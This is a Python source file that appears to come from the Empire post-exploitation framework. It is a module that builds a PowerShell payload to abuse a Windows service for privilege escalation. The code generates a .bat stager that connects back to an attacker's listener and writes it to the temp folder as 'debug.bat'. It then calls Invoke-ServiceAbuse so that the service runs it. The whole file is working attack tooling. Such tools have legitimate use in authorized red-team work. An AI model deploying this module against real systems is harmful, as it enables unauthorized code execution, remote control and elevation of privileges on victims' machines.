from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # extract all of our options
        service_name = params["ServiceName"]

        # generate the .bat launcher code to write out to the specified location
        launcher = main_menu.stagertemplatesv2.new_instance("windows_launcher_bat")
        launcher.options["Listener"]["Value"] = params["Listener"]
        launcher.options["UserAgent"]["Value"] = params["UserAgent"]
        launcher.options["Proxy"]["Value"] = params["Proxy"]
        launcher.options["ProxyCreds"]["Value"] = params["ProxyCreds"]
        launcher.options["Delete"]["Value"] = "True"
        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = ';$tempLoc = "$env:temp\\debug.bat"'
        script_end += '\n$batCode = @"\n' + launcher_code + '"@\n'
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += '"Launcher bat written to $tempLoc `n";\n'

        if launcher_code == "":
            raise ModuleValidationException("Error in launcher .bat generation.")

        script_end += (
            'Invoke-ServiceAbuse -ServiceName "'
            + service_name
            + '" -Command "C:\\Windows\\System32\\cmd.exe /C `"$env:Temp\\debug.bat`""'
        )

        return script, script_end
